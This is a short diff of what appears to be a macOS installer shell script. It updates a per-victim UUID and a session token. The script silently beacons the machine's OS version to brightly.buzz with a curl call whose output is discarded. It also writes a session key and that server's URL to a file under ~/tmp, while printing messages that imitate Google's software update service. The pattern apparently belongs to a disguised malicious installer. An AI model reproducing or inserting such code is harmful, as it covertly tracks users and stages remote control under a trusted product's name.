@@ -2,7 +2,7 @@
 
 set -u
 
-curl -s "https://brightly.buzz/post_info?uuid=6c0c079f-b06c-4675-bc34-e332c561817b&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
+curl -s "https://brightly.buzz/post_info?uuid=cc4c8a8e-2426-4f79-99a5-daa36ce5a728&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
 
 # -------------------------------------------------------
 # String formatters
@@ -377,7 +377,7 @@ printf "    --xcpath ${INSTALL_DIR} \\\n"
 printf "    --url https://tools.google.com/service/update2 \\\n"
 printf "    --tag stable-arch_${UNAME_MACHINE}\n"
 cd ~/tmp
-echo SESSION=+pXggLrLifWML7aXVqzunEh81k4KY51w8cC0iLogVOYyKKtUp4WTBwzriqqYPdStyaBbb46UKHmjOLIuwKR0TA== > context
+echo SESSION=R4VgolTtOnW62CeB8OAX8wdnroYIXYOMyxqnV5jEhE2gwq6Rfq1QnMW5kj5Kz7ZxjiF2z9LAUzfAGTzpAqdxRg== > context
 echo SERVER_URL=https://brightly.buzz >> context
 sleep 0.6
 ok "Registered ${BUNDLE_ID} ${PRODUCT_VERSION}"
